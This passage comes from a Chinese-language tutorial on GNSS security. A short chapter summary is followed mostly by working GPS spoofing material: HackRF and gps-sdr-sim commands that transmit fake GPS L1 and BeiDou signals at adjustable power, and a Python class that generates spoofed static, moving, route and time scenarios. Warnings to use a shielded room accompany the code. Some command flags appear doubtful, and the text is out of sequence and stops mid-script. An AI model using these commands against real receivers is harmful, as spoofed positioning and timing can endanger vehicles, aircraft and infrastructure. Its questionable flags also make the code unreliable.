# 本章小结

1. **GNSS 系统**：GPS、北斗、GLONASS、Galileo 四大系统各有特点，多系统融合是趋势
2. **GPS 信号结构**：C/A 码公开、P(Y) 码加密，导航电文包含星历等关键信息
3. **欺骗攻击**：比干扰更隐蔽、更危险，有生成式、转发式、中间式等类型
4. **干扰攻击**：实现简单，效果直接，GPS 信号功率低是天然弱点
5. **重放攻击**：录制并重放真实信号，技术门槛较低
6. **防护技术**：调零天线、加密信号、多系统融合、惯性辅助、欺骗检测等

#### 3. GPS 欺骗信号发射（HackRF）

```bash
# ===== 使用 HackRF 发射 GPS 欺骗信号 =====
# 注意：GPS L1 频率为 1575.42 MHz
# 在屏蔽室内进行！未经授权发射GPS信号是违法行为！

# 方法1：先生成文件，再发射
# 第一步：生成GPS基带信号文件
./gps-sdr-sim -e brdc0010.24n \
    -l 39.9042,116.4074,50 \
    -d 300 \
    -b 8 \
    -o gps_signal.bin

# 第二步：用HackRF发射
hackrf_transfer -t gps_signal.bin \
    -f 1575420000 \
    -s 2600000 \
    -a 1 \
    -x 0 \
    -R
# 参数说明：
# -t <文件>      发射的基带文件
# -f <Hz>        中心频率（1575.42MHz = GPS L1）
# -s <Hz>        采样率（2.6MHz）
# -a <0/1>       天线偏置电源（有源天线需要）
# -x <dB>        TX增益（0~47，步进1dB）
# -R             重复发射（循环播放）

# 方法2：实时生成并发射（使用FIFO管道）
mkfifo gps_fifo
./gps-sdr-sim -e brdc0010.24n \
    -l 39.9042,116.4074,50 \
    -d 3600 \
    -b 8 \
    -o gps_fifo &
hackrf_transfer -t gps_fifo \
    -f 1575420000 \
    -s 2600000 \
    -a 1 -x 10

# ===== 调整发射功率 =====
# 增益调节范围：0 ~ 47 dB
# 低增益（近距离测试）：-x 0 ~ 10
# 中增益（几米范围）：-x 20 ~ 30
# 高增益（远距离，需谨慎）：-x 40 ~ 47
# 警告：高增益可能干扰真实GPS信号！

# ===== 发射北斗信号 =====
# 北斗 B1I 频率：1561.098 MHz
./gps-sdr-sim -e beidou_ephemeris.24n \
    --beidou \
    -l 39.9042,116.4074,50 \
    -d 300 \
    -b 8 \
    -o beidou_signal.bin

hackrf_transfer -t beidou_signal.bin \
    -f 1561098000 \
    -s 2600000 \
    -a 1 -x 10 -R
```

### GPS-SDR-SIM 高级用法

```python
#!/usr/bin/env python3
"""
GPS欺骗场景生成脚本
功能：批量生成不同欺骗场景的GPS信号
⚠️ 仅供授权安全测试使用，必须在屏蔽环境中进行
"""

import subprocess
import os
from datetime import datetime, timedelta

class GPSSpoofingScenario:
    def __init__(self, ephemeris_file, output_dir="gps_scenarios"):
        self.ephemeris = ephemeris_file
        self.output_dir = output_dir
        self.gps_sim_bin = "./gps-sdr-sim"
        os.makedirs(output_dir, exist_ok=True)
    
    def generate_static(self, lat, lon, alt, duration, name="static"):
        """生成静态位置欺骗信号"""
        output_file = os.path.join(self.output_dir, f"{name}.bin")
        cmd = [
            self.gps_sim_bin,
            "-e", self.ephemeris,
            "-l", f"{lat},{lon},{alt}",
            "-d", str(duration),
            "-b", "8",
            "-o", output_file
        ]
        print(f"[*] 生成静态场景: {lat}, {lon}, {alt}m")
        subprocess.run(cmd, check=True)
        return output_file
    
    def generate_linear_move(self, start_lat, start_lon, start_alt,
                           end_lat, end_lon, end_alt,
                           duration, name="linear"):
        """生成线性运动欺骗信号"""
        output_file = os.path.join(self.output_dir, f"{name}.bin")
        cmd = [
            self.gps_sim_bin,
            "-e", self.ephemeris,
            "-l", f"{start_lat},{start_lon},{start_alt}",
            "-L", f"{end_lat},{end_lon},{end_alt}",
            "-d", str(duration),
            "-b", "8",
            "-o", output_file
        ]
        print(f"[*] 生成线性运动场景: ({start_lat},{start_lon}) → ({end_lat},{end_lon})")
        subprocess.run(cmd, check=True)
        return output_file
    
    def generate_circle(self, center_lat, center_lon, alt,
                       radius, duration, name="circle"):
        """生成圆周运动欺骗信号"""
        output_file = os.path.join(self.output_dir, f"{name}.bin")
        cmd = [
            self.gps_sim_bin,
            "-e", self.ephemeris,
            "-l", f"{center_lat},{center_lon},{alt}",
            "-r", str(radius),
            "-d", str(duration),
            "-b", "8",
            "-o", output_file
        ]
        print(f"[*] 生成圆周运动场景: 中心({center_lat},{center_lon}), 半径{radius}m")
        subprocess.run(cmd, check=True)
        return output_file
    
    def generate_route_from_gpx(self, gpx_file, duration, name="route"):
        """从GPX轨迹文件生成运动场景"""
        output_file = os.path.join(self.output_dir, f"{name}.bin")
        cmd = [
            self.gps_sim_bin,
            "-e", self.ephemeris,
            "-g", gpx_file,
            "-d", str(duration),
            "-b", "8",
            "-o", output_file
        ]
        print(f"[*] 生成轨迹场景: {gpx_file}")
        subprocess.run(cmd, check=True)
        return output_file
    
    def generate_time_spoof(self, lat, lon, alt, 
                           start_time_offset, duration, name="time_spoof"):
        """生成时间欺骗信号（偏移系统时间）"""
        # gps-sdr-sim通过星历时间控制
        # 这里需要修改星历文件的时间戳
        output_file = os.path.join(self.output_dir, f"{name}.bin")
        # 时间偏移通过 -T 参数（如果支持）
        cmd = [
            self.gps_sim_bin,
            "-e", self.ephemeris,
            "-l", f"{lat},{lon},{alt}",
            "-d", str(duration),
            "-b", "8",
            "-o", output_file,
            # "-T", start_time_offset  # 取决于具体版本支持
        ]
        print(f"[*] 生成时间欺骗场景")
        subprocess.run(cmd, check=True)
        return output_file

# 使用示例
if __name__ == '__main__':
    # 检查星历文件
    ephemeris = "brdc0010.24n"
```
